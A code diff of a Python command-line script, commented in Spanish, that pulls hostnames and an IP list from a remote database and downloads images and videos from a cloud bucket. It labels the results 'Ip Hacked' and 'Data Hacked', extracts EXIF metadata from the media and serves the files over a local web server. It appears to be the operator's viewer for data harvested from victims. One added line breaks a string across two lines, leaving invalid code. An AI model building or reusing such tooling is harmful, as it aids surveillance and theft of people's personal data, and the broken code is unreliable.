@@ -1,10 +1,11 @@
 import argparse
-import subprocess
-import requests
-from google.cloud import storage
-from time import sleep
 import os
 import platform
+import subprocess
+from time import sleep
+
+import requests
+from google.cloud import storage
 
 # Lista de extensiones de archivo permitidas
 allowed_extensions = ['.png', '.jpg', '.mp4']
@@ -16,14 +17,10 @@ def get_hostnames():
     hostname_response = requests.get(hostname_url)
     hostname_data = hostname_response.json()
 
+    print("HostName\n")
     hostnames = list(set(hostname_data.values()))
-    print("""
-              HostName""")
     for hostname in hostnames:
-        print(f'''
-              ----------
-              {hostname}
-              ---------- ''')
+        print(f'----------\n{hostname}\n----------')
 
 # Obtener y mostrar todos los datos de la base de datos de IPs
 def get_all_ips():
@@ -35,20 +32,27 @@ def get_all_ips():
      ============
     | Ip Hacked |
     ============\n""")
-    with open('ip_data.txt', 'w') as file:
-        for data in ip_data.values():
-            if isinstance(data, list):
-                formatted_data = ','.join(data)
-                formatted_data = formatted_data.replace(',', '\n=>  ')
-            else:
-                formatted_data = data
-            file.write(str(formatted_data) + '\n')
+    
+    # Verificar si 'ip' está presente en los datos
+    if 'ip' in ip_data:
+        ips = ip_data['ip']['ips']
+        with open('ip_data.txt', 'w') as file:
+            for data in ips:
+                if isinstance(data, dict):  # Verificar si es un diccionario
+                    ip_info = ", ".join([f"{key}: {value}" for key, value in data.items()])
+                    file.write(ip_info + '\n')
+                elif isinstance(data, str):  # Verificar si es una cadena
+                    file.write(data + '\n')
+                else:
+                    file.write(str(data) + '\n')
 
-    # Leer y mostrar los datos del archivo de texto según el sistema operativo
-    if platform.system() == 'Windows':
-        os.system("type ip_data.txt | findstr /v /c:\",")
+        # Leer y mostrar los datos del archivo de texto según el sistema operativo
+        if platform.system() == 'Windows':
+            os.system("type ip_data.txt | findstr /v /c:\",")
+        else:
+            os.system("cat ip_data.txt | grep -v ','")
     else:
-        os.system("cat ip_data.txt | grep -v ','")
+        print("No se encontraron datos de IPs en la respuesta JSON.")
 
 # Obtener nombres de archivos y mostrarlos sin repetir
 def get_file_names():
@@ -62,17 +66,15 @@ def get_file_names():
         blob.name.endswith(ext) for ext in allowed_extensions)]
     file_names = list(set(file_names))
 
-    print("""\n
-     ==============
-    | Data Hacked |
-    ==============\n""")
+    print("\n==============\n| Data Hacked |\n==============\n")
     for file_name in file_names:
         print('=> Data Extract Complete')
-        download_path = f'/data/data/com.termux/files/home/storage/shared/Hacked{file_name}'
+        download_path = f'C:/Users/Junnior/
+        Desktop/Osiris/Hacked{file_name}'
         os.makedirs(os.path.dirname(download_path), exist_ok=True)
         blob = bucket.blob(file_name)
         blob.download_to_filename(download_path)
-        print(f"Exitoso")
+        print("Exitoso")
 
 # Obtener datos EXIF de una imagen utilizando exiftool
 def get_exif_data(image_path):
@@ -85,7 +87,6 @@ def get_exif_data(image_path):
 parser = argparse.ArgumentParser()
 parser.add_argument('-M', action='store_true', help='Monitor en tiempo real 👀')
 parser.add_argument('-DH', nargs='?', const='', help='Extrae los metadatos🔎')
-
 parser.add_argument('-V', nargs='?', const='', help='File data')
 
 # Analizar los argumentos de línea de comandos
@@ -118,6 +119,4 @@ elif args.V:
         os.system("termux-open http://[::]:7777 ; python -m http.server 7777 --directory Hacked")
     elif op == "exit":
         os.system("cls" if os.name == "nt" else "clear")
-        exit
-
-
+        exit()
